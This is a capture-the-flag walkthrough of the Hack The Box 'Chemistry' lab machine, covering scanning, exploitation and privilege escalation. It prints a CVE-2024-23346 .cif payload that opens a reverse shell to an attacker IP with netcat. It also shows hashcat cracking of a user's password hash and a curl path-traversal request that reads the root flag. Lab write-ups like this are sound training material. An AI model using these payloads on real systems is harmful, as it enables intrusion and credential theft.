First, I'm going to perform a port scanning in order to find out which ports are open:

<div style="text-align:center;">
  <pre><code class="language-bash">sudo nmap -sS --open -p- -Pn -n -vvv --min-rate 5000 &lt;target_IP&gt;</code></pre>
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/1.png" alt="Nmap full port scan results showing open ports 22, 5000 and 8089 on the target machine" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>
We have the following ports open → 22, 5000 and 8089. So our next step is to perform a exhaustive scan to find out the versions and additional information about the discovered ports:
<div style="text-align:center;">
  <pre><code class="language-bash">sudo nmap -sCV &lt;target_IP&gt;</code></pre>
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/2.png" alt="Nmap service version scan output identifying SSH on port 22 and a web application on port 5000" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/3.png" alt="Nmap service version scan continued output with additional port details" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

As you can see above, port 22 is a <em>SSH</em> service, port 5000 scan result gives us information related to a web application and port 8089 we don't know what it is at the moment.

As we don't have valid credentials to perform a login via <em>SSH</em>, we are going to check the web application on port 5000:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/5.png" alt="Chemistry web application homepage running on port 5000" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

At first glance we are not able to see interesting information. So let's fuzzing the web to find out some hidden directories.

We can use either <code>Gobuster</code>, <code>Wfuzz</code> or other fuzzer to do this task. I used <code>Gobuster</code>, for instance.

<div style="text-align:center;">
  <pre><code class="language-bash">gobuster dir -u &lt;http://target_IP&gt; -w &lt;path_to_wordlist&gt;</code></pre>
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/6.png" alt="Gobuster directory fuzzing results revealing hidden directories /login and /register" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Nice! We found a hidden directory called <em>/login</em> and <em>/register</em>:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/7.png" alt="Login page of the Chemistry web application" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/8.png" alt="Register page of the Chemistry web application" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

We can proceed by registering a new account, where we will find text that says 'An example is available here'. Clicking on it will download a <code>.cif</code> file.

A <strong>CIF</strong> file is a <em>Crystallographic Information File</em>. You can read more about it <a href="https://en.wikipedia.org/wiki/Crystallographic_Information_File" target="_blank">here!</a>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/9.png" alt="Content of the example .cif Crystallographic Information File downloaded from the application" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>
This is the <code>.cif</code> file.

Now, we can search on Google for information about any vulnerability related with this kind of file.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/10.png" alt="Search results showing CVE-2024-23346 vulnerability related to .cif files in pymatgen" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

I found this <a href="https://github.com/9carlo6/CVE-2024-23346" target="_blank">GitHub repository</a>, where you can find a <code>.cif</code> file that contains the exploit.

The methodology is to embed a <em>reverse shell</em> (by specifying the VPN IP and listener port) inside the file to gain access to the victim machine.

<div style="text-align:center;">
  <pre style="white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word;"><code class="language-bash">_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__( *[().__class__.__mro__[1]]+ ["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc &lt;Attacker_IP&gt; &lt;Listener_Port&gt; -e /bin/bash");0,0,0'</code></pre>
</div>

We modify the script and upload the file to the system. At the same time, we listen on the port we specified in the script with <code>Netcat</code>, and if we press the button that says 'View', the reverse shell will be triggered:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/11.png" alt="Malicious .cif file uploaded to the Chemistry application to trigger the reverse shell" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/12.png" alt="Netcat listener receiving the reverse shell connection from the target machine" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

After that, we are inside the server, so the next step is to find out where the <em>user flag</em> is.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/13.png" alt="Shell access on the target machine navigating directories to locate the user flag" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

The <em>user flag</em> is located in the user <strong>rosa</strong> directory, but if we perform a <code>cat</code> to visualize the content, an error will be displayed saying that we don't have the required permissions.

We can confirm this by using <code>ls -la</code>, and since we are the app user, we belong to the other group for that file, so we cannot open it.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/14.png" alt="ls -la output confirming user flag file is owned by rosa with no read permission for the current user" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

As a conclusion, we need to pivot to user <strong>rosa</strong> to visualize the content of the <em>user flag</em>. To achieve this, we need to find information on a privilege escalation vector that allows us to pivot to that user.

By navigating through directories we find a database, which may can contain credentials of the system users. So, if we convert this file into a <em>base64</em> string, we can copy it to our machine in order to see what it contains.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/15.png" alt="SQLite database file being encoded to base64 string for exfiltration to the attacker machine" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>
We convert the file into a base64 string.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/16.png" alt="Decoding the base64 string back to the original SQLite database file on the attacker machine" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>
We decrypt the base64 string into its normal state.

After that, we have the database on our machine without any problems. We can check the file's integrity by using <code>md5sum</code> on both machines. If the hash is the same, the file hasn't changed during the transfer.

Now, we can use the <code>sqlite3</code> tool to view the tables of the database.

By using an <em>SQL</em> query, we can list the users from a table:

<div style="text-align:center;">
  <pre><code class="language-sql" >SELECT * FROM &lt;table_name&gt;</code></pre>
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/17.png" alt="SQLite3 query output listing users and their hashed passwords from the Chemistry database" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Awesome, we have information about users and their passwords, which are hashed. So, we need to decrypt them for a potential connection via <em>SSH</em>.

To decrypt the passwords, we can user either <code>JohnTheRipper</code> or <code>Hashcat</code>.

Before all of that, we store the hash of the user <strong>rosa</strong> in a '.txt' file and then proceed to decrypt the password.

<div style="text-align:center;">
  <pre><code class="language-bash">hashcat -m 0 -a 0 rosa.txt /usr/share/wordlist/rockyou.txt;</code></pre>
</div>

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/18.png" alt="Hashcat output successfully cracking rosa's password hash, revealing credentials rosa:unicorniosrosados" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

We got the rosa's password, and its credentials are → <strong>rosa:unicorniosrosados</strong>.

Now, with these credentials, we can perform a connection via <em>SSH</em> as <strong>rosa</strong> user:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/19.png" alt="SSH connection established to the target machine as user rosa" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>
We stablish the <em>SSH</em> connection.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/20.png" alt="User flag found in rosa's home directory on the target machine" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

The <em>user flag</em> is located on the user' home directory.

After getting the <em>user flag</em>, we need to obtain the <em>root flag</em>. To achieve this, we need to find a privilege escalation vector.

We can perform a <code>sudo -l</code> to check if the user <strong>rosa</strong> can execute commands as sudo, but no luck.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/21.png" alt="sudo -l output confirming rosa has no sudo privileges on the system" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Also, we can check the binaries with the SUID bit set, by using the following command → <code>find / -perm -4000 2>/dev/null | xargs ls -l</code>:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/22.png" alt="find command output listing binaries with SUID bit set, showing no unusual or exploitable binaries" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

We also did not find an unusual binary with the SUID bit set, so we can use <code>linpeas.sh</code> in order to find vulnerabilities on the machine.

We can find this script in rosa's user <em>/home</em> directory:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/23.png" alt="linpeas.sh script found in rosa's home directory ready for privilege escalation enumeration" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Let's execute the <code>linpeas.sh</code> script:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/24.png" alt="linpeas.sh output highlighting internally open ports not visible from outside, including port 8080" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

If we use this script, we can find that there are several ports open that are not visible from outside. That is, we can see these ports if we are on the victim machine but not on our own.

Another way to find this information is by using this command → <code>netstat -tulnp | grep -i listen</code>.

Knowing this, we see that something is running on port 8080. We can use the <code>curl</code> command to check whether it is a web application or not.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/25.png" alt="curl request to localhost port 8080 confirming a web application with aiohttp server version headers" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

After reading the headers of the request, we confirm that we are dealing with a web application.

Thanks to that, we have the server version and the status of the request headers. Therefore, we can look for vulnerabilities in this website by using this exploit → <a href="https://github.com/z3rObyte/CVE-2024-23334-PoC" target="_blank">CVE-2024-23334-PoC</a>.

A good practice is to see what the exploit does to understand how it works. So, let's check the exploit using <code>cat</code> command:

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/26.png" alt="CVE-2024-23334-PoC exploit script content showing the path traversal technique targeting aiohttp" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

As you can see, the command executes a <em>path traversal</em> to read an arbitrary file. That is, the website is vulnerable to a <strong>Local File Inclusion</strong> or <strong>LFI</strong> vulnerability.

So, instead of executing the whole script, we can perform a request using the <code>curl</code> command as follows:

<div style="text-align:center;">
  <pre><code class="language-bash">curl --path-as-is http://localhost:8080/../../../../root/root.txt</code></pre>
</div>

Why the <em>/root</em> directory? Because the <em>root flag</em> is located there, so if we can read this file, we can obtain the flag we desire.

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/28.png" alt="curl path traversal request successfully reading the root flag via CVE-2024-23334 LFI vulnerability" onclick="openModal(this.src)" style="width:100%; max-width:inherit;">
</div>

Done, we got the <em>root flag</em>.

---

<div style="text-align: center;">
  <img src="/images/Rooms/HTB/Chemistry/29.png" alt="Hack The Box Achievement" style="width:100%; max-width:inherit;">
</div>
